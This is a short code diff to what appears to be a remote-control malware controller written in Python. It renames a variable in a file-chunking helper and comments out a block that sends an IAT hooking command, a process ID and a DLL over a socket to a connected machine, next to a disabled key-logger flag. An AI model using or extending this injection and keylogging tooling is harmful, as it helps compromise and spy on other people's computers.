@@ -23,10 +23,10 @@ def bin_file_to_buffer(file_path):
     Default chunk size: 1k."""
     with open(file_path, 'rb') as fp:
         while True:
-            data1 = fp.read(CHUNK_SIZE)
-            if not data1:
+            data = fp.read(CHUNK_SIZE)
+            if not data:
                 break
-            yield data1
+            yield data
 
 def full_bin_file_to_buffer(file_path):
     with open(file_path, 'rb') as fp:
@@ -139,13 +139,15 @@ if __name__ == '__main__':
         # is_running_key_logger = False
 
 
-        # IAT Hooking
-        SocketManager.send_data(conn, "IAT_HOOKING")
-        SocketManager.send_data(conn, str(IAT_HOOKING_PROCESS_ID))
+        # # IAT Hooking
+        # SocketManager.send_data(conn, "IAT_HOOKING")
+        # SocketManager.send_data(conn, str(IAT_HOOKING_PROCESS_ID))
+        #
+        # for chunk in bin_file_to_buffer(IAT_HOOKING_DLL):
+        #     SocketManager.send_data(conn, chunk)
+        #
+        # SocketManager.send_data(conn, "END_IAT_HOOKING")
 
-        for chunk in bin_file_to_buffer(IAT_HOOKING_DLL):
-            SocketManager.send_data(conn, chunk)
 
-        SocketManager.send_data(conn, "END_IAT_HOOKING")
 
 conn.close()
